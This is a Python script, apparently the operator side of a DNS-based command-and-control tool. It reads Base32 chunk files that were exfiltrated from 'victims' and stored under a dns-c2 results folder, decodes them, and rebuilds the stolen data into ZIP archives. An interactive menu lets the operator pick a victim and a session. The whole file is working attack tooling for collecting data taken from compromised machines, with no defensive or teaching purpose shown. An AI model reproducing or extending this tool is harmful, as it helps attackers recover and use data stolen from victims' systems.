import os
import glob
import base64
import shutil
import logging

# Set up logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(message)s",
    handlers=[
        logging.FileHandler("analyzer.log"),
        logging.StreamHandler()
    ]
)

def get_sorted_chunks(session_dir):
    """Retrieve and sort chunk files from a session directory."""
    chunk_files = glob.glob(os.path.join(session_dir, "chunk*.b64"))
    logging.info(f"Found chunk files in {session_dir}: {[os.path.basename(f) for f in chunk_files]}")
    return sorted(chunk_files, key=lambda x: int(os.path.basename(x).replace("chunk", "").replace(".b64", "")))

def decode_base32_chunks(chunk_files):
    """Decode Base32-encoded chunks into binary data."""
    decoded_data = bytearray()
    for chunk_file in chunk_files:
        try:
            with open(chunk_file, "r") as f:
                base32_data = f.read().strip()
                logging.info(f"Raw content of {os.path.basename(chunk_file)}: {base32_data}")
                # Preprocess the data: convert to uppercase, remove invalid characters
                base32_data = base32_data.upper()
                # Ensure proper padding (Base32 length must be multiple of 8)
                padding_needed = (8 - len(base32_data) % 8) % 8
                base32_data += "=" * padding_needed
                logging.info(f"Processed Base32 data for {os.path.basename(chunk_file)}: {base32_data}")
                decoded_chunk = base64.b32decode(base32_data)
                decoded_data.extend(decoded_chunk)
                logging.info(f"Decoded chunk from {os.path.basename(chunk_file)}")
        except base64.binascii.Error as e:
            logging.error(f"Base32 decoding error for {chunk_file}: {e}")
            return None
        except Exception as e:
            logging.error(f"Error reading {chunk_file}: {e}")
            return None
    return bytes(decoded_data)

def rebuild_zip(victim_hash, session_id, output_dir="restored_zips"):
    """Rebuild a ZIP file from chunks for a given victim and session."""
    results_dir = os.path.join(os.path.expanduser("~/dns-c2/logs/results"), victim_hash, session_id)
    if not os.path.exists(results_dir):
        logging.error(f"Session directory not found: {results_dir}")
        return

    chunk_files = get_sorted_chunks(results_dir)
    if not chunk_files:
        logging.error(f"No chunk files found in {results_dir}")
        return

    decoded_data = decode_base32_chunks(chunk_files)
    if decoded_data is None:
        return

    # Create output directory if it doesn't exist
    os.makedirs(output_dir, exist_ok=True)
    output_filename = f"victim_{victim_hash}_{session_id}_restored.zip"
    output_path = os.path.join(output_dir, output_filename)

    try:
        with open(output_path, "wb") as f:
            f.write(decoded_data)
        logging.info(f"Successfully rebuilt ZIP file: {output_path}")
    except Exception as e:
        logging.error(f"Failed to write ZIP file {output_path}: {e}")

def list_victims(results_base_dir):
    """List all victim hashes in the results directory."""
    victims = [d for d in os.listdir(results_base_dir) if os.path.isdir(os.path.join(results_base_dir, d))]
    return victims

def list_sessions(results_base_dir, victim_hash):
    """List all session IDs for a given victim."""
    sessions_dir = os.path.join(results_base_dir, victim_hash)
    if not os.path.isdir(sessions_dir):
        logging.error(f"Victim directory does not exist or is not a directory: {sessions_dir}")
        return []
    
    # Debug: List all entries in the directory
    all_entries = os.listdir(sessions_dir)
    logging.info(f"Entries in {sessions_dir}: {all_entries}")
    
    sessions = [d for d in all_entries if os.path.isdir(os.path.join(sessions_dir, d))]
    if not sessions:
        logging.error(f"No session directories found in {sessions_dir}, entries present: {all_entries}")
    return sessions

def main():
    """Main function with interactive victim and session selection."""
    # Use expanded home directory path
    results_base_dir = os.path.expanduser("~/dns-c2/logs/results")
    if not os.path.exists(results_base_dir):
        logging.error(f"Results directory not found: {results_base_dir}")
        return

    # List victims
    victims = list_victims(results_base_dir)
    if not victims:
        logging.error("No victims found in the results directory")
        return
    print("Available victims:")
    for i, victim in enumerate(victims, 1):
        print(f"{i}. {victim}")
    victim_choice = int(input("Select a victim by number: ")) - 1
    if victim_choice < 0 or victim_choice >= len(victims):
        logging.error("Invalid victim selection")
        return
    selected_victim = victims[victim_choice]

    # List sessions for the selected victim
    sessions = list_sessions(results_base_dir, selected_victim)
    if not sessions:
        return
    print(f"\nAvailable sessions for victim {selected_victim}:")
    for i, session in enumerate(sessions, 1):
        print(f"{i}. {session}")
    session_choice = int(input("Select a session by number: ")) - 1
    if session_choice < 0 or session_choice >= len(sessions):
        logging.error("Invalid session selection")
        return
    selected_session = sessions[session_choice]

    # Rebuild ZIP for the selected victim and session
    logging.info(f"Rebuilding ZIP for victim {selected_victim}, session {selected_session}")
    rebuild_zip(selected_victim, selected_session)

if __name__ == "__main__":
    main()
